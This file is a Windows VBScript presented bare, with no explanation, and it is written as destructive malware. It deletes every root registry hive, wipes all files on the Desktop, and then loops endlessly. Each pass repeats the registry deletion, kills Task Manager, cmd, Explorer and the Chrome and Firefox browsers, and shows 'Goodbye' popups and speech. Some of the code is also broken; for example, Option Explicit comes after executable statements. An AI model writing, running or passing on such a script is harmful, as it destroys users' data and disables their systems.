Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegDelete "HKEY_CURRENT_CONFIG"
WshShell.RegDelete "HKEY_USERS"
WshShell.RegDelete "HKEY_LOCAL_MACHINE"
WshShell.RegDelete "HKEY_CURRENT_USER"
WshShell.RegDelete "HKEY_CLASSES_ROOT"
WScript.Sleep 1000

Option Explicit

Dim objFSO, objFolder, objFile, objShell, i

' Create a FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Get the Desktop folder
Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFolders("Desktop"))

' Loop through each file in the Desktop folder and delete it
For Each objFile In objFolder.Files
    objFSO.DeleteFile(objFile)
Next

' Release FileSystemObject resources
Set objFile = Nothing
Set objFolder = Nothing
Set objFSO = Nothing

' Create a Shell object
Set objShell = CreateObject("WScript.Shell")

' Say "Goodbye" and terminate various processes on the computer
i = 1
Do While True
    ' Delete registry keys
    Set WshShell = WScript.CreateObject("WScript.Shell")
    WshShell.RegDelete "HKEY_CURRENT_CONFIG"
    WshShell.RegDelete "HKEY_USERS"
    WshShell.RegDelete "HKEY_LOCAL_MACHINE"
    WshShell.RegDelete "HKEY_CURRENT_USER"
    WshShell.RegDelete "HKEY_CLASSES_ROOT"
    
    ' Say "Goodbye"
    objShell.Run "PowerShell -Command ""Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Goodbye')""", 0, True

    ' Terminate various processes on the computer
    objShell.Run "taskkill /f /im taskmgr.exe", 0, True
    objShell.Run "taskkill /f /im cmd.exe", 0, True
    objShell.Run "taskkill /f /im explorer.exe", 0, True
    objShell.Run "taskkill /f /im chrome.exe", 0, True
    objShell.Run "taskkill /f /im firefox.exe", 0, True

    ' Play a beep sound
    objShell.Run "PowerShell -Command ""[System.Media.SystemSounds]::Beep.Play()""", 0, True

    ' Display a message box with the word "Goodbye" and an error icon
    objShell.Popup "Goodbye", 0, "Error", &H10

    ' Wait for one second before repeating the loop
    WScript.Sleep 1000
Loop
